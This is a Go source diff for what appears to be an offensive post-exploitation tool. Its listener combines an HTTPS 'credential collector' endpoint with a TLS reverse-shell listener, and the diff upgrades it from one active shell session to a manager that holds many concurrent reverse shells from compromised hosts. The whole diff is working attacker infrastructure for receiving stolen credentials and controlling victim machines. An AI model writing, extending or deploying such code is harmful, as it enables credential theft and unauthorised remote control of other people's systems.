@@ -28,21 +28,21 @@ type ListenerStats struct {
 // UnifiedListener manages both the HTTPS credential collector and the TLS
 // shell listener as a single unit. Start/stop controls both ports together.
 type UnifiedListener struct {
-	config        ListenerConfig
-	cert          tls.Certificate
-	httpServer    *http.Server
-	shellListener net.Listener
-	activeSession *ShellSession
-	running       bool
-	mu            sync.RWMutex
-	stats         ListenerStats
+	config         ListenerConfig
+	cert           tls.Certificate
+	httpServer     *http.Server
+	shellListener  net.Listener
+	SessionManager *ShellSessionManager
+	running        bool
+	mu             sync.RWMutex
+	stats          ListenerStats
 
 	// OnCredReceived is called when credentials arrive at the /collect endpoint.
 	// Set this before calling Start() to wire into the identity manager.
 	OnCredReceived func(ReceivedCredentials)
 
 	// OnShellConnected is called when a reverse shell connection arrives.
-	// The session is available for bridging after this callback.
+	// The session is stored in the SessionManager; the callback is for notification only.
 	OnShellConnected func(session *ShellSession)
 
 	// OnEvent is called for every listener event (connections, errors, etc).
@@ -69,8 +69,9 @@ func DefaultListenerConfig() ListenerConfig {
 // Does not start listening -- call Start() for that.
 func NewUnifiedListener(config ListenerConfig) *UnifiedListener {
 	return &UnifiedListener{
-		config:     config,
-		stopAccept: make(chan struct{}),
+		config:         config,
+		stopAccept:     make(chan struct{}),
+		SessionManager: NewShellSessionManager(),
 	}
 }
 
@@ -164,10 +165,9 @@ func (l *UnifiedListener) Stop() error {
 	// Signal accept loop to stop
 	close(l.stopAccept)
 
-	// Close active shell session
-	if l.activeSession != nil {
-		l.activeSession.Close()
-		l.activeSession = nil
+	// Close all shell sessions
+	for _, session := range l.SessionManager.List() {
+		session.Close()
 	}
 
 	// Shut down HTTPS server
@@ -213,11 +213,9 @@ func (l *UnifiedListener) GetStats() ListenerStats {
 	return l.stats
 }
 
-// GetActiveSession returns the current shell session, if any.
-func (l *UnifiedListener) GetActiveSession() *ShellSession {
-	l.mu.RLock()
-	defer l.mu.RUnlock()
-	return l.activeSession
+// GetSessionManager returns the shell session manager.
+func (l *UnifiedListener) GetSessionManager() *ShellSessionManager {
+	return l.SessionManager
 }
 
 // emitEvent sends an event to the REPL callback and writes it to the log file.
@@ -273,41 +271,38 @@ func (l *UnifiedListener) acceptLoop() {
 			}
 		}
 
+		// Register the session and assign an ID
+		sessionID := l.SessionManager.Add(session)
+
 		l.mu.Lock()
-		// Close any existing session before accepting new one
-		if l.activeSession != nil {
-			l.activeSession.Close()
-		}
-		l.activeSession = session
 		l.stats.ShellSessions++
-		l.stats.ActiveSessions = 1
+		l.stats.ActiveSessions = l.SessionManager.ActiveCount()
 		l.mu.Unlock()
 
 		l.emitEvent(ListenerEvent{
 			Type:     EventShellConnect,
 			SourceIP: session.SourceIP(),
-			Message:  fmt.Sprintf("Reverse shell connected from %s", session.SourceIP()),
+			Message:  fmt.Sprintf("Session %d opened - reverse shell from %s", sessionID, session.SourceIP()),
 		})
 
 		if l.OnShellConnected != nil {
 			l.OnShellConnected(session)
 		}
 
-		// Wait for session to end, then update stats
-		go func() {
-			<-session.Done()
+		// Watch for session death and update stats
+		go func(s *ShellSession, id int) {
+			<-s.Done()
 			l.mu.Lock()
-			if l.activeSession == session {
-				l.activeSession = nil
-				l.stats.ActiveSessions = 0
-			}
+			l.stats.ActiveSessions = l.SessionManager.ActiveCount()
 			l.mu.Unlock()
+
+			l.SessionManager.Remove(id)
 
 			l.emitEvent(ListenerEvent{
 				Type:     EventShellDisconnect,
-				SourceIP: session.SourceIP(),
-				Message:  fmt.Sprintf("Shell session disconnected from %s", session.SourceIP()),
+				SourceIP: s.SourceIP(),
+				Message:  fmt.Sprintf("Session %d closed - %s disconnected", id, s.SourceIP()),
 			})
-		}()
+		}(session, sessionID)
 	}
 }
